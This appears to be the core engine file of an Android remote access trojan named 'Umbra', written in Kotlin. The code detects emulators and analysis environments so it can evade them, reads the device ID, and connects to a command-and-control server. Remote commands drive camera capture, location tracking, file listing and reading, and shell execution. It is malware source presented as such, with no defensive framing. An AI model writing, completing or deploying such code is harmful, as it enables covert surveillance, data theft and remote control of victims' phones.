package dev.yassine.umbra.core

import android.content.Context
import android.provider.Settings
import android.util.Log
import dev.yassine.umbra.c2.C2Coordinator
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.modules.CameraModule
import dev.yassine.umbra.modules.FileModule
import dev.yassine.umbra.modules.LocationModule
import dev.yassine.umbra.modules.ShellModule
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json

object UmbraEngine {
    private const val TAG = "Umbra"
    private const val DEFAULT_C2 = "wss://10.0.2.2:8443/c2"
    private var started = false

    fun start(context: Context) {
        if (started) return
        started = true

        if (!SandboxDetector.isRealDevice(context)) {
            Log.w(TAG, "Sandbox/emulator detected — refusing to start engine")
            return
        }

        if (SandboxDetector.looksLikeAnalysis()) {
            Log.w(TAG, "Analysis environment detected — sleeping")
            Thread.sleep(3600_000)
            return
        }

        val deviceId = getDeviceId(context)
        val prefs = context.getSharedPreferences("umbra_prefs", Context.MODE_PRIVATE)
        val c2Url = prefs.getString("c2_base_url", DEFAULT_C2) ?: DEFAULT_C2
        val fcmToken = prefs.getString("fcm_token", null)

        prefs.edit().putString("device_id", deviceId).apply()

        val handlers: Map<String, suspend (Command) -> String> = mapOf(
            "ping"     to { cmd -> Json.encodeToString(
                dev.yassine.umbra.c2.CommandResult.serializer(),
                dev.yassine.umbra.c2.CommandResult(cmd.cmd_id, "ok", "pong")) },
            "info"     to { cmd ->
                val data = InfoModule.gather(context)
                Json.encodeToString(
                    dev.yassine.umbra.c2.CommandResult.serializer(),
                    dev.yassine.umbra.c2.CommandResult(cmd.cmd_id, "ok", data)) },
            "camera"   to { cmd -> CameraModule.capture(context, cmd) },
            "location" to { cmd -> LocationModule.get(context, cmd) },
            "files"    to { cmd -> FileModule.list(context, cmd) },
            "file_read" to { cmd -> FileModule.read(context, cmd) },
            "shell"    to { cmd -> ShellModule.exec(cmd) }
        )

        C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
        Log.d(TAG, "Engine started — device=$deviceId")
    }

    fun stop() {
        C2Coordinator.stop()
        started = false
    }

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: android.os.Build.getSerial()
    }
}
